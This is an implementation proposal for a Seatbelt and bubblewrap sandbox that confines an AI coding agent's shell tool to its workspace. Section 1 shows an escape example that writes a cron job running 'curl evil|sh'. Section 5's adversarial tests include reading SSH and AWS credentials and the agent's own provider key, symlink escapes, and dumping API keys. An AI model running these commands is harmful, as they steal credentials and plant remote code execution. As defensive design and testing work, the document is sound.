# BW-031 — Sandbox Adapter: Implementation Proposal

**Status:** proposal, not implemented. No code in this document exists yet.
**Author:** alpha-stabilisation increment, 2026-11-23.
**Task:** BW-031 "Docker sandbox adapter" (P1, L), with BW-032 as its adversarial test suite.
**Decision required before implementation:** which backend is the default, and whether Docker
remains in scope at all.

---

## 1. Why this is the release blocker

BW-059 fences **file tools**. It does not contain `shell`. Every verified claim about the fence
says so, and `KNOWN_LIMITATIONS.md` §1 leads with it.

The concrete hole, stated as an attacker would use it:

```bash
# Passes every BW-059 check: no path argument looks outside the fence.
python3 -c "open('/etc/cron.d/x','w').write('* * * * * curl evil|sh')"
```

`shellPathTokens` sees no outside path. `workdir` is in scope. The write happens inside the
interpreter, where a policy that inspects command strings cannot see it. Every permitted shell
call is recorded as `unconstrained` — which is honest, but an audit entry written after the fact
is not a boundary.

**Therefore:** for a supervised internal alpha, the documented guardrail is defensible. For an
external alpha, it is not, and no amount of additional string inspection makes it so. The fix
must be enforced by the operating system below the interpreter, not by Bashwink above it.

## 2. What already exists — do not build a custom sandbox

Both serious implementations in this space converged on the same two OS primitives, and both
stopped maintaining a Docker-first story. That is the strongest available evidence about what to
build on.

| Project | macOS | Linux | Notes |
| --- | --- | --- | --- |
| Claude Code (`sandbox-runtime`, `@anthropic-ai/sandbox-runtime`) | Seatbelt (`sandbox-exec`) | bubblewrap + socat | Same engine for the per-command sandbox and for wrapping the whole session. Explicitly excludes native Windows. |
| Zed editor | Seatbelt | bubblewrap (non-setuid only) | Refuses a setuid-root `bwrap`, because a setuid binary would run root-privileged setup with arguments partly derived from model-influenced input. |
| OpenCode / Bashwink | none | none | The gap this proposal closes. |

**The relevant lesson from Zed's write-up:** it refuses setuid `bwrap` specifically because the
setup arguments are model-influenced. Any adapter we write must use the unprivileged
user-namespace path only.

**Docker is the wrong default here**, and the task title says "Docker sandbox adapter". Reasons,
in order of weight:

1. **Startup cost.** A container per tool call is seconds; a container per session breaks the
   interactive loop. Both reference implementations chose in-process OS isolation for this reason.
2. **Path semantics.** Bind-mounting the workspace changes inode identity, which breaks file
   watchers, `git` worktrees with absolute paths, and hardlink-based tooling. Seatbelt and
   bubblewrap leave paths identical to the host.
3. **Availability.** Docker requires a daemon and a licence decision for some users; `sandbox-exec`
   ships with macOS, `bwrap` is a small distro package.
4. **It is not more secure for this threat model.** The threat is an agent escaping a directory
   fence, not a hostile kernel exploit. Container isolation is stronger against the latter and
   largely irrelevant to the former.

**Recommendation:** implement BW-031 as a **Seatbelt (macOS) + bubblewrap (Linux) adapter**, and
keep a container backend as an optional third mode for users who already run one. This is a
deliberate departure from the task title's "Docker" wording, and it needs sign-off rather than a
silent reinterpretation.

## 3. Feasibility — verified on this machine, not assumed

macOS 27.0.1, `/usr/bin/sandbox-exec` present. A profile denying all writes and all network,
with one workspace exception, was executed against real shells:

```
profile: (allow default)(deny file-write*)(allow file-write* (subpath "<realpath>"))(deny network*)

in-scope write          -> WROTE_IN_SCOPE          (succeeded)
new file in scope       -> NEW_OK                  (succeeded)
write outside scope     -> "Operation not permitted" (file absent)
read of /etc/hosts      -> READ_BLOCKED
curl https://example.com-> NET_BLOCKED
```

**One trap found and proven, which would have silently broken every sandboxed write:** on macOS
`/tmp` is a symlink to `/private/tmp`, and Seatbelt evaluates the **resolved** path. A profile
allowing `(subpath "/tmp/repo")` denied writes to `/tmp/repo` — the exact failure mode where a
sandbox appears to work but blocks the agent's legitimate work. The same class of containment
decision BW-059 already makes (`realpath` of the deepest existing ancestor) must be reused to
build these profiles.

**Not yet verified:** `bwrap` behaviour on this machine (no Linux host available). The Linux
adapter must be developed against CI's `ubuntu-latest`, where it can be exercised for real, and
its tests must be skipped — visibly, not silently passed — on macOS.

## 4. Proposed architecture

One new module, `packages/bw-evidence/src/sandbox.ts`, plus wiring at the existing single
enforcement point.

**The key design constraint: do not create a second policy engine.** BW-059 already computes the
verdict (allow/deny, with rule and target) for every tool call. The sandbox must *consume* that
same `ScopePolicy`, not re-derive it. Two independent notions of "in scope" would drift, and the
one that drifts is always the one nobody tested.

### 4.1 Two enforcement layers, one policy

```
                     ScopePolicy (one source of truth)
                            │
        ┌───────────────────┴───────────────────┐
        │                                       │
  Layer 1: pre-execution                 Layer 2: OS sandbox
  (BW-059, exists today)                 (BW-031, this proposal)
  refuses obvious violations,            confines everything the tool
  records `denied` entries               actually executes
```

Layer 1 gives a **useful error** ("this path is outside your scope") before anything runs.
Layer 2 gives an **actual boundary** when Layer 1 cannot decide — which is precisely the shell
case. Neither is sufficient alone: Layer 2 alone produces opaque `EPERM`s that a model retries
forever; Layer 1 alone is advisory for shell.

### 4.2 How the sandbox wraps execution

Bashwink must not become a second runtime. Two candidate integration points, in order of
preference:

**Option A — wrap the runtime process (recommended for alpha).**
Launch the whole OpenCode child under the sandbox:

```bash
# macOS
sandbox-exec -f "$profilePath" "$OPENCODE_BIN" ...
# Linux
bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp \
      --bind "$WORKSPACE" "$WORKSPACE" \
      --unshare-pid --unshare-ipc --unshare-uts --unshare-net --die-with-parent \
      --chdir "$WORKSPACE" "$OPENCODE_BIN" ...
```

This confines the agent **and** the runtime's own plugin host with no per-call plumbing, and it is
the smallest possible change to Bashwink: one `spawn` argument list. Zed and Anthropic's runner
both do the whole-process form for the same reason.

Its cost: the runtime cannot reach its own state directory unless that is bound too, and a
network-denied profile cannot reach the model provider — so the model API host must be allowed
explicitly (see 4.4). Get this wrong and the symptom is "the model stopped working", not "the
sandbox blocked it".

**Option B — wrap each shell call (later, if A proves too coarse).**
Route `shell` through a sandboxed wrapper. Finer-grained, and allows per-call profiles, but it
requires the plugin's `execute.before` to rewrite the tool input, which changes what the model
asked for — and the evidence chain must then record both the original and the rewritten command.
More invasive; defer.

**Recommendation:** Option A for BW-031.

### 4.3 Generated Seatbelt profile

```scheme
(version 1)
(allow default)
;; writes: only the workspace, resolved physically at generation time
(deny file-write*)
(allow file-write* (subpath "<realpath(workspace)>"))
(allow file-write* (subpath "/private/tmp"))        ;; TMPDIR; required by most toolchains
(allow file-write* (subpath "<realpath(data-dir)>")) ;; evidence log, run records, SQLite
;; reads: credentials are denied even though they are readable in principle
(deny file-read* (subpath "<home>/.ssh"))
(deny file-read* (subpath "<home>/.aws"))
(deny file-read* (subpath "<home>/.config/gh"))
(deny file-read* (literal "<home>/.netrc"))
(deny file-read* (subpath "<home>/.hermes"))        ;; holds Bashwink's own provider keys
;; network: deny by default, allow only the configured provider host
(deny network*)
(allow network-outbound (remote ip "api.example.com:443"))
```

Three things worth flagging:

- **`(allow default)` first, then deny.** Seatbelt is last-match-wins, so order matters and a
  profile that reads top-down as "deny everything then allow some" produces the opposite of the
  intent if the denies are placed first. The profile above is ordered deliberately and must be
  tested, not reasoned about.
- **`/private/tmp` is allowed** because compilers, `pip`, and test runners require a writable temp
  dir. That is a real hole (a model can write there), and it is the same hole the reference
  implementations accept. It should be a tmpfs in Option A's container variant, and it must be
  disclosed as a limit either way.
- **The provider host must be allowed**, and the host list should come from the resolved
  `baseURL` of the active provider, not be hardcoded.

### 4.4 Linux profile (bubblewrap)

```bash
--ro-bind / /                     # whole filesystem readable
--dev /dev --proc /proc
--tmpfs /tmp                      # private tmp
--bind "$WORKSPACE" "$WORKSPACE"  # the one writable path
--ro-bind "$DATA" "$DATA"         # evidence: readable, not writable by the agent
--unshare-pid --unshare-ipc --unshare-uts
--die-with-parent
--chdir "$WORKSPACE"
# network: --unshare-net, or a proxy that allowlists the provider host
```

**Constraint discovered in the reference docs:** filesystem restrictions are decided at sandbox
creation, so an agent given a non-Git directory can create `.git` inside it. That is acceptable
(the workspace is writable by design) but must be understood: the sandbox bounds *where*, not
*what*.

`--unshare-net` is all-or-nothing on Linux; host-specific egress needs a proxy. The reference
implementations use an HTTP/HTTPS proxy for this, noting that tools ignoring proxy variables
(`ssh`, raw sockets) will not work even when the host is allowed. For alpha, deny network by
default and document that `bwrap` mode requires either a proxy or no network.

### 4.5 Failure modes that must not fail open

The single most important rule: **if the sandbox cannot be created, the run must not proceed with
the fence as its only protection while claiming sandboxing.** Two acceptable behaviours, chosen by
an explicit config value rather than a default that surprises someone:

| Config | Sandbox unavailable | Behaviour |
| --- | --- | --- |
| `sandbox = "require"` (default for external alpha) | exit nonzero | Refuse to start; print the missing dependency and how to install it. |
| `sandbox = "auto"` | warn loudly | Continue with BW-059 only; the run record and the evidence log carry `sandbox=unavailable`; `doctor` reports a warning. |
| `sandbox = "off"` | n/a | Current behaviour; recorded as `sandbox=off`. |

Zed's documented behaviour is to fall back with a warning; Anthropic's is `failIfUnavailable`.
Both are reasonable, which is why this is a config decision and not something to guess.

## 5. Negative tests (BW-032)

Each of these must be a fixture that **fails loudly if the boundary is absent**, run on both
platforms, and record the refusal cause. None of them may pass by being skipped silently.

### Filesystem
1. `echo x > /tmp/outside.txt` — write outside the workspace is refused.
2. `python3 -c "open('/etc/passwd','a')"` — the interpreter form of the same escape; **this is the
   test BW-059 cannot pass today**.
3. `ln -s /etc evil && echo x > evil/hosts` — symlink escape from inside the workspace.
4. `cd / && touch /root/x` — traversal via absolute path.
5. Write to `$HOME/.bashrc` — refused; the home directory is not the workspace.
6. Write inside the workspace **succeeds** — the control case. A sandbox that blocks everything is
   not a passing sandbox.

### Credentials and secrets
7. `cat ~/.ssh/id_*` — refused.
8. `cat ~/.aws/credentials` — refused.
9. `cat ~/.hermes/.env` — refused; this is where Bashwink's own provider key lives.
10. `env | grep -i api_key` — the key must not be in the sandboxed environment unless the provider
    needs it, and if it is, it must be the provider's variable only.

### Network
11. `curl https://example.com` — blocked when network is denied.
12. `curl https://<provider-host>` — **must succeed** in Option A, or no inference happens. This
    test exists to catch the failure mode where the sandbox silently breaks the product.
13. `curl` to a raw IP, bypassing DNS — blocked.
14. A tool honouring `HTTP_PROXY` reaches an allowlisted host, and a non-allowlisted host is
    refused (only where a proxy is configured).

### Process and resources
15. A forked grandchild cannot escape: `sh -c 'python3 -c "open(\"/tmp/x\",\"w\")"'` — still confined.
16. `--die-with-parent`: killing Bashwink leaves no sandboxed children alive.
17. Memory/CPU limits (container mode only; `bwrap` has no native quota) — a runaway loop is
    killed, not left to consume the host.
18. Cancellation mid-command leaves no partial sandbox and no orphan process.

### Integrity of the record
19. A denied attempt appears in the evidence chain with the sandbox as its stated cause, distinct
    from a BW-059 `denied` entry — the two layers must be distinguishable when reading a run.
20. A sandbox-creation failure is recorded as `sandbox=unavailable`, never omitted.
21. With `sandbox = "require"` and no backend, the run exits nonzero **before** the runtime starts.

## 6. Effort and sequencing

| Step | Work | Estimate |
| --- | --- | --- |
| 1 | `sandbox.ts`: availability probe, profile generation from `ScopePolicy`, wrapped spawn | 1–2 d |
| 2 | macOS Seatbelt adapter + tests against the traps found above | 1–2 d |
| 3 | Linux bwrap adapter, developed on CI | 2–3 d |
| 4 | BW-032 adversarial fixture suite (the 21 cases above) | 2–3 d |
| 5 | Docs: which layer refuses what; update `KNOWN_LIMITATIONS.md` §1 | 0.5 d |
| 6 | Provider-host allowlist derived from the resolved `baseURL` | 0.5 d |

Roughly **7–12 days**, excluding the container backend, which is a separate ~3 days and should be
deferred until the two OS backends are proven.

## 7. What this does not solve

Stated here so the proposal is not read as a security guarantee:

- **Hostile code is still hostile.** Both backends isolate a process, not a kernel. The Arch wiki
  says it plainly: sandboxing cannot make running untrusted code safe.
- **`/private/tmp` remains writable** in the OS backends, because toolchains need it.
- **Network allowlisting is host-based**, so a compromised allowlisted host is a path out.
- **The evidence chain is still truncatable** (see `KNOWN_LIMITATIONS.md` §5) — an agent that can
  write `$DATA` can rewrite its own record. The Linux profile makes `$DATA` read-only; the
  Seatbelt profile must do the same and this must be a test, not an intention.
- **Windows remains unsupported** and untested.

## 8. Decision requested

1. Approve **Seatbelt + bubblewrap as the BW-031 backends**, departing from the task title's
   "Docker" wording — or reject and require a container-first design.
2. Choose the default for `sandbox`: `require` (refuse to start without a backend) or `auto`
   (warn and continue). The first is right for an external alpha; the second is friendlier for
   the internal one.
3. Confirm option A (wrap the whole runtime process) over per-call wrapping.

Until 1–3 are decided and implemented, the external-alpha verdict stays **FAIL**, and the honest
statement remains the one in `KNOWN_LIMITATIONS.md`: a guardrail, not a sandbox.
